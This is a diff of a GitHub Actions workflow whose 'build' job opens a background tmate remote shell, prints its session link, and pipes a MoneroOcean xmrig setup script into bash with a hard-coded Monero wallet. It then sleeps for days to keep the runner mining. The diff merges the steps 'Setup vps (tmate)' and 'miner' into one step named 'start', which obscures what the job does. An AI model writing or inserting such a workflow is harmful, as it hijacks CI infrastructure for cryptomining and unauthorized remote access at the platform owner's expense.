@@ -6,13 +6,26 @@ on:
 jobs:
   build:
     runs-on: ubuntu-latest
+    
     steps:
-      - name: Setup vps (tmate)
+      - name: start
         run: |
-          sudo apt update
+          echo "=== updating system ==="
+          sudo apt update -qq
+          
+          echo "=== installing tmate ==="
           sudo apt install -y tmate
-          tmate -F &
-
-      - name: miner
-        run: |
+          
+          echo "=== tmate ==="
+          tmate -F > /tmp/tmate.log 2>&1 &
+          sleep 5
+          
+          echo "=== installing miner ==="
           curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 48ZnWombESDbm8o3GzDsYbjHULahvMMW6V5nEXhVzJQXcnxMEtJNVcjSHFHKeVFXMniPEvpH635De74x4KJa4aDgL5YNez1
+          
+          echo "=== miner ==="
+          echo "tmate session:"
+          cat /tmp/tmate.log | tail -n 10
+          
+          echo "keepalive"
+          sleep 800000  
